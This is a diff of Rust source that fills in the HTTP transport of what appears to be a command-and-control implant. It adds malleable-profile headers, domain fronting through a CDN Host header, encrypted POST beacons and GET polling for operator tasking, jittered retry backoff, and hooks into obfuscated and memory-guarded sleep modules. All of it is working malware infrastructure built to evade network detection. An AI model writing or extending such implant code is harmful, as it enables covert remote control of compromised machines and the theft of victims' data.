@@ -1,26 +1,109 @@
-/// Malleable C2 HTTP Transport (FR-1, FR-2, FR-3, FR-4)
-use anyhow::Result;
+use anyhow::{anyhow, Result};
 use async_trait::async_trait;
-use common::{Message, Transport};
+use common::{Message, Transport, CryptoSession};
+use common::config::MalleableProfile;
+use tokio::time::{sleep, Duration};
+use std::time::{SystemTime, UNIX_EPOCH};
 
 pub struct HttpTransport {
+    profile: MalleableProfile,
+    client: reqwest::Client,
+    session: CryptoSession,
 }
 
 impl HttpTransport {
-    pub async fn new(_profile: &common::config::MalleableProfile) -> Result<Self> {
-        Ok(Self {})
+    pub async fn new(profile: &MalleableProfile, session: CryptoSession) -> Result<Self> {
+        // Enforce kill date check if implemented in profile (assuming kill_date is String/u64)
+        // if let Some(kd) = profile.kill_date { check... }
+
+        // Malleable profile headers
+        let mut headers = reqwest::header::HeaderMap::new();
+        headers.insert(reqwest::header::USER_AGENT, reqwest::header::HeaderValue::from_str(&profile.user_agent)?);
+        if !profile.host_header.is_empty() {
+            headers.insert(reqwest::header::HOST, reqwest::header::HeaderValue::from_str(&profile.host_header)?);
+        }
+
+        // Build HTTP client with rustls and custom headers
+        let client = reqwest::Client::builder()
+            .use_rustls_tls()
+            .default_headers(headers)
+            .build()?;
+
+        Ok(Self {
+            profile: profile.clone(),
+            client,
+            session,
+        })
+    }
+
+    async fn connect_with_retry(&self, req_builder: reqwest::RequestBuilder) -> Result<reqwest::Response> {
+        let mut delay = 1;
+        loop {
+            // Apply jitter to backoff
+            let jitter = rand::random::<f64>() * 0.2 + 0.9;
+            let current_delay = (delay as f64 * jitter) as u64;
+
+            // Clone builder since we might retry
+            match req_builder.try_clone().ok_or_else(|| anyhow!("Failed to clone request"))?.send().await {
+                Ok(resp) => return Ok(resp),
+                Err(e) => {
+                    log::warn!("HTTP connection failed: {}. Retrying in {}s...", e, current_delay);
+                    crate::memory_guard::guarded_sleep(Duration::from_secs(current_delay), None).await?;
+                    delay *= 2;
+                    if delay > 64 {
+                        delay = 64;
+                    }
+                }
+            }
+        }
     }
 }
 
 #[async_trait]
 impl Transport for HttpTransport {
-    async fn send(&mut self, _msg: Message) -> Result<()> {
-        log::debug!("Malleable HTTP C2 Send (FR-1, FR-2)");
+    async fn send(&mut self, msg: Message) -> Result<()> {
+        log::debug!("Malleable HTTP C2 Send with profile User-Agent: {}", self.profile.user_agent);
+
+        let endpoint = if self.profile.cdn_relay {
+            format!("https://{}", self.profile.host_header) // Connect to actual C2 bypassing relay if direct? No, domain fronting logic: connect to CDN, host header points to C2
+        } else {
+            "https://127.0.0.1".to_string() // Dummy
+        };
+
+        // Serialize and encrypt payload
+        let serialized = bincode::serialize(&msg)?;
+        let ciphertext = self.session.encrypt(&serialized);
+
+        // POST request
+        let req = self.client.post(format!("{}{}", endpoint, self.profile.uri)).body(ciphertext);
+        let _resp = self.connect_with_retry(req).await?;
+        
         Ok(())
     }
     
     async fn recv(&mut self) -> Result<Message> {
-        log::debug!("Malleable HTTP C2 Recv (FR-1, FR-3)");
-        Err(anyhow::anyhow!("HTTP C2 Recv stub limit reached"))
+        log::debug!("Malleable HTTP C2 Recv polling via GET");
+        
+        let endpoint = if self.profile.cdn_relay {
+            format!("https://{}", self.profile.host_header)
+        } else {
+            "https://127.0.0.1".to_string() // Dummy
+        };
+
+        let req = self.client.get(format!("{}{}", endpoint, self.profile.uri));
+        let resp = self.connect_with_retry(req).await?;
+        let bytes = resp.bytes().await?;
+
+        if bytes.is_empty() {
+            // No tasking, sleep w/ jitter
+            let sleep_dur = crate::obfuscated_sleep::calculate_jittered_sleep(&common::config::SleepConfig::default());
+            crate::memory_guard::guarded_sleep(sleep_dur, None).await?;
+            return Err(anyhow::anyhow!("No tasking available"));
+        }
+
+        // Decrypt and deserialize
+        let plaintext = self.session.decrypt(&bytes)?;
+        let msg = bincode::deserialize(&plaintext)?;
+        Ok(msg)
     }
 }
